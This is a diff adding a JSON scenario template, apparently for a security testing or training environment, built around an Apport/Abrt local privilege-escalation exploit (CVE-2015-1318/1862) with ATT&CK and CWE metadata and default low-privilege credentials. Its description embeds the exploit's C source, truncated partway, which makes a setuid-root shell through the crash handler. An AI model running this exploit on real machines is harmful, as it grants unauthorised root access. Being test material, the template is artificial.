@@ -1,0 +1,30 @@
+{
+  "template_id": "auto_edb_36746",
+  "category": "C2_systemd",
+  "attack_technique": "T1543.002",
+  "cwe": "CWE-732",
+  "description": "Linux privilege escalation: Apport/Abrt (Ubuntu / Fedora) - Local Privilege Escalation (CVE-2015-1862;CVE-2015-1318;OSVDB-120803;OSVDB-120802)\n\nExploit source code (36746.c):\n```\n#define _GNU_SOURCE\n#include <stdio.h>\n#include <unistd.h>\n#include <stdlib.h>\n#include <fcntl.h>\n#include <signal.h>\n#include <elf.h>\n#include <err.h>\n#include <syslog.h>\n#include <sched.h>\n#include <linux/sched.h>\n#include <sys/types.h>\n#include <sys/stat.h>\n#include <sys/auxv.h>\n#include <sys/wait.h>\n\n# warning this file must be compiled with -static\n\n//\n// Apport/Abrt Vulnerability Demo Exploit.\n//\n//  Apport: CVE-2015-1318\n//  Abrt:   CVE-2015-1862\n//\n//   -- taviso@cmpxchg8b.com, April 2015.\n//\n// $ gcc -static newpid.c\n// $ ./a.out\n// uid=0(root) gid=0(root) groups=0(root)\n// sh-4.3# exit\n// exit\n//\n// Hint: To get libc.a,\n//  yum install glibc-static or apt-get install libc6-dev\n//\n\nint main(int argc, char **argv)\n{\n    int status;\n    Elf32_Phdr *hdr;\n    pid_t wrapper;\n    pid_t init;\n    pid_t subprocess;\n    unsigned i;\n\n    // Verify this is a static executable by checking the program headers for a\n    // dynamic segment. Originally I thought just checking AT_BASE would work,\n    // but that isnt reliable across many kernels.\n    hdr = (void *) getauxval(AT_PHDR);\n\n    // If we find any PT_DYNAMIC, then this is probably not a static binary.\n    for (i = 0; i < getauxval(AT_PHNUM); i++) {\n        if (hdr[i].p_type == PT_DYNAMIC) {\n            errx(EXIT_FAILURE, \"you *must* compile with -static\");\n        }\n    }\n\n    // If execution reached here, it looks like we're a static executable. If\n    // I'm root, then we've convinced the core handler to run us, so create a\n    // setuid root executable that can be used outside the chroot.\n    if (getuid() == 0) {\n        if (chown(\"sh\", 0, 0) != 0)\n            exit(EXIT_FAILURE);\n\n        if (chmod(\"sh\", 04755) != 0)\n            exit(EXIT_FAILURE);\n\n        return EXIT_SUCCESS;\n    }\n\n    // If I'm not root, but euid is 0, then the exploit worked and we can spawn\n    // a shell and cleanup.\n    if (setuid(0) == 0) {\n        system(\"id\");\n        system(\"rm -rf exploit\");\n        execlp(\"sh\", \"sh\", NULL);\n\n        // Something went wrong.\n        err(EXIT_FAILURE, \"failed to spawn root shell, but exploit worked\");\n    }\n\n    // It looks like the exploit hasn't run yet, so create a chroot.\n    if (mkdir(\"exploit\", 0755) != 0\n     || mkdir(\"exploit/usr\", 0755) != 0\n     || mkdir(\"exploit/usr/share\", 0755) != 0\n     || mkdir(\"exploit/usr/share/apport\", 0755) != 0\n     || mkdir(\"exploit/usr/libexec\", 0755) != 0) {\n        err(EXIT_FAILURE, \"failed to create chroot directory\");\n    }\n\n    // Create links to the exploit locations we need.\n    if (link(*argv, \"exploit/sh\") != 0\n     || link(*argv, \"exploit/usr/share/apport/apport\") != 0        // Ubuntu\n     || link(*argv, \"exploit/usr/libexec/abrt-hook-ccpp\") != 0) {  // Fedora\n        err(EXIT_FAILURE, \"failed to create required hard links\");\n    }\n\n    // Create a subprocess so we don't enter the new namespace.\n    if ((wrapper = fork()) == 0) {\n\n        // In the child process, create a new pid and user ns. The pid\n        // namespace is only n\n```",
+  "cve": "CVE-2015-1862;CVE-2015-1318;OSVDB-120803;OSVDB-120802",
+  "exploitdb_id": "36746",
+  "feasibility": "L1",
+  "docker_run_args": [],
+  "detection_difficulty": "medium",
+  "interaction_mode": "multi_step",
+  "params": {
+    "username": {
+      "type": "string",
+      "default": "lowpriv"
+    },
+    "password": {
+      "type": "string",
+      "default": "password123"
+    }
+  },
+  "instances": [
+    {
+      "scenario_id": "edb_36746",
+      "type": "core",
+      "difficulty": "hard"
+    }
+  ]
+}
